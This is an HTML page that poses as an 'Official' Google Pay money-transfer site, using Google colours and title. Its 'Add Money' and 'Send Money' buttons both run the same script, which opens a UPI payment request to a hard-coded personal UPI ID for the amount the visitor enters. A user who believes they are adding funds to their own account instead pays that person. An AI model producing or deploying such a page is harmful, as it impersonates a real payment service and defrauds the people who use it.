<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Pay - Official Money Transfer</title>
    <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');body {
        font-family: 'Roboto', sans-serif;
        background: url('https://source.unsplash.com/1600x900/?finance,technology') no-repeat center center fixed;
        background-size: cover;
        color: white;
        text-align: center;
        margin: 0;
        padding: 0;
        position: relative;
    }
    
    /* Dark overlay for better visibility */
    body::before {
        content: "";
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.7);
        z-index: -1;
    }
    
    .container {
        background: rgba(0, 0, 0, 0.85);
        max-width: 450px;
        margin: 80px auto;
        padding: 30px;
        border-radius: 15px;
        box-shadow: 0 0 25px rgba(66, 133, 244, 0.9);
        backdrop-filter: blur(10px);
        position: relative;
        z-index: 1;
    }
    
    h2 {
        color: #4285F4;
        text-shadow: 2px 2px 15px rgba(66, 133, 244, 1);
        animation: glow 1.5s infinite alternate;
    }
    
    @keyframes glow {
        from { text-shadow: 2px 2px 10px rgba(66, 133, 244, 0.8); }
        to { text-shadow: 2px 2px 20px rgba(255, 255, 255, 1); }
    }
    
    input {
        padding: 12px;
        width: calc(100% - 24px);
        margin: 10px 0;
        border: 2px solid #4285F4;
        border-radius: 8px;
        font-size: 16px;
        background: black;
        color: white;
        text-align: center;
        box-shadow: 0 0 10px rgba(66, 133, 244, 0.5);
        transition: 0.3s;
    }
    
    input:focus {
        box-shadow: 0 0 15px rgba(255, 255, 255, 0.9);
    }
    
    button {
        padding: 12px;
        width: 100%;
        font-size: 18px;
        font-weight: bold;
        color: white;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        margin-top: 10px;
        transition: 0.3s;
    }
    
    .add-btn {
        background: linear-gradient(135deg, #34A853, #0F9D58);
        box-shadow: 0 0 15px rgba(52, 168, 83, 0.8);
    }
    
    .send-btn {
        background: linear-gradient(135deg, #EA4335, #FF5733);
        box-shadow: 0 0 15px rgba(234, 67, 53, 0.8);
    }
    
    button:hover {
        transform: scale(1.1);
        box-shadow: 0 0 20px rgba(255, 255, 255, 1);
    }
</style>

</head>
<body>
    <div class="container">
        <h2>Google Pay - Official Money Transfer</h2>
        <label for="amount">Enter Amount (INR):</label><br>
        <input type="number" id="amount" placeholder="Enter amount" required>
        <button class="add-btn" onclick="sendMoney()">Add Money</button>
        <button class="send-btn" onclick="sendMoney()">Send Money</button>
    </div><script>
    function sendMoney() {
        var amount = document.getElementById("amount").value;
        if (amount < 1) {
            alert("Please enter a valid amount!");
            return;
        }
        var upiID = "960rahulkumar@upi";
        var upiURL = `upi://pay?pa=${upiID}&pn=Rahul Kumar&mc=&tid=&tr=&tn=Send%20Money&am=${amount}&cu=INR`;
        window.location.href = upiURL;
    }
</script>

</body>
</html>
